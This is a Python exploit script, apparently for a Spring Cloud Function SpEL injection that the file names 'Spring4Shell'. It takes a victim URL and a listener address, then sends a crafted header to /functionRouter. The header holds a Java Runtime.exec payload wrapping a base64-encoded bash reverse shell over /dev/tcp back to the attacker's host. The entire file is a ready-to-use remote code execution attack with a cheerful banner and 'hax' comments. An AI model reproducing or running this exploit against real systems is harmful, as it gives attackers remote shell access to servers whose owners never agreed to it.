#######################
# Author: MarkBuffalo #
#######################

import requests
import sys
import base64
import urllib3
import argparse
from colorama import Fore


class Spring4Shell:
    def __init__(self):
        # So we don't get annoying certificate errors while attempting to hax.
        urllib3.disable_warnings()

        # Our fearless parser thingmabob
        self.parser = argparse.ArgumentParser()
        self.parser.add_argument("-u", "--url", required=True,
                                 help="The URL of the site. e.g.: hxxps://www.victimsite.com/")
        # This is for the listening host
        self.parser.add_argument("-l", "--lhost", required=True,
                                 help="The IP address of the host listening for a shell. e.g.: 192.168.1.133")
        # This is for the listening port
        self.parser.add_argument("-p", "--port", required=True,
                                 help="The port you're listening on with the listening host. e.g.: 4443")
        self.args = self.parser.parse_args()


        # This is the reverse shell. You'll set the IP to your host IP, and the port to your host's port.
        # Example: python3 spring4shell.py hxxps://www.victimsite.com 13.33.33.37 4443
        self.reverse_shell = f"bash -i >&/dev/tcp/{self.args.lhost}/{self.args.port} 0>&1"

        # This is the CMD payload that we wrap inside of the Java payload.
        self.cmd = "bash -c {echo," + self.transform_cmd(self.reverse_shell) + "}|{base64,-d}|{bash,-i}"

        # This is the Java payload we want to send.
        self.payload = f"T(java.lang.Runtime).getRuntime().exec(\"{self.cmd}\")"

        # These are the headers we'll be using to fool the server into thinking we're using a web browser. Unsure if
        # request minimization is required, but this works.
        self.headers = {
            "spring.cloud.function.routing-expression": self.payload,
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Accept-Language": "en",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        # Colors. No leet program is complete without colors to spice things up.
        # Will have to hang our heads in shame if this lacks colors.
        self.a = Fore.GREEN
        self.b = Fore.WHITE
        self.c = Fore.CYAN
        self.d = Fore.MAGENTA
        self.f = Fore.BLUE
        self.g = Fore.RESET
        self.h = Fore.LIGHTGREEN_EX
        self.r = Fore.MAGENTA

        self.print_banner()

    def print_banner(self):
        banner = "\nWelcome to the...\n\n"
        banner += f"     a██╗b███████╗a██████╗ b██████╗ a██╗   ██╗\n"
        banner += f"     a██║b██╔════╝a██╔══██╗b██╔══██╗a╚██╗ ██╔╝\n"
        banner += f"     a██║b█████╗  a██████╔╝b██████╔╝ a╚████╔╝\n"
        banner += f"a██   ██║b██╔══╝  a██╔══██╗b██╔══██╗  a╚██╔╝\n"
        banner += f"a╚█████╔╝b███████╗a██║  ██║b██║  ██║   a██║\n"
        banner += f" ╚════╝ b╚══════╝╚a═╝  ╚═╝b╚═╝  ╚═╝   a╚═╝\n"
        banner += "\n"
        banner += f"b███████╗a██████╗ b██████╗ a██╗b███╗   ██╗a ██████╗b ███████╗a██████╗\n"
        banner += f"b██╔════╝a██╔══██╗b██╔══██╗a██║b████╗  ██║a██╔════╝b ██╔════╝a██╔══██╗\n"
        banner += f"b███████╗a██████╔╝b██████╔╝a██║b██╔██╗ ██║a██║  ███╗b█████╗  a██████╔╝\n"
        banner += f"b╚════██║a██╔═══╝ b██╔══██╗a██║b██║╚██╗██║a██║   ██║b██╔══╝  a██╔══██╗\n"
        banner += f"b███████║a██║     b██║  ██║a██║b██║ ╚████║a╚██████╔╝b███████╗a██║  ██║\n"
        banner += f"b╚══════╝a╚═╝     b╚═╝  ╚═╝a╚═╝b╚═╝  ╚═══╝a ╚═════╝ b╚══════╝a╚═╝  ╚═╝g\n"
        banner += "\n...show!\n\n"

        print(banner.replace("a", self.h).replace("b", self.b).replace("g", self.g))

    def c_print(self, output):
        print(self.colorize_output(output))

    def colorize_output(self, msg):
            return(msg.replace("[", f"{self.c}[{self.g}").
                   replace("]", f"{self.c}]{self.g}").
                   replace("--", f"{self.b}--{self.g}").
                   replace("***", f"{self.h}**{self.g}").
                   replace("++", f"{self.c}++{self.g}").
                   replace("/", f"{self.d}/{self.g}").
                   replace(":", f"{self.d}:{self.h}").
                   replace("@", f"{self.d}@{self.g}").
                   replace("!", f"{self.h}!{self.g}").
                   replace(",", f"{self.d},{self.g}").
                   replace(";", f"{self.d};{self.r}").
                   replace("'", f"{self.d}'{self.g}").
                   replace("?", f"{self.r}?{self.g}").
                   replace("’", f"{self.d}’{self.g}").
                   replace("\"", f"{self.d}’{self.g}") + self.g)

    def attempt_exploitation(self):
        # Create a POST request.
        self.c_print(f"[!] Attempting to put the hax on {self.args.url}...")
        r = requests.post(self.args.url + "/functionRouter", headers=self.headers, data="lol", verify=False)

        # When the exploit fires, status_code is 500.
        if r.status_code == 500:
            self.c_print("[!] Exploit might be successful. Check your reverse shell.")
        # Some other status code? Likely not successful.
        else:
            self.c_print("[?] Exploitation failed :-(")

    # Transform the cmd string into a base64 encoded string
    @staticmethod
    def transform_cmd(cmd):
        return base64.b64encode(cmd.encode("UTF-8")).decode("ascii")


if __name__ == "__main__":
    s = Spring4Shell()
    s.attempt_exploitation()
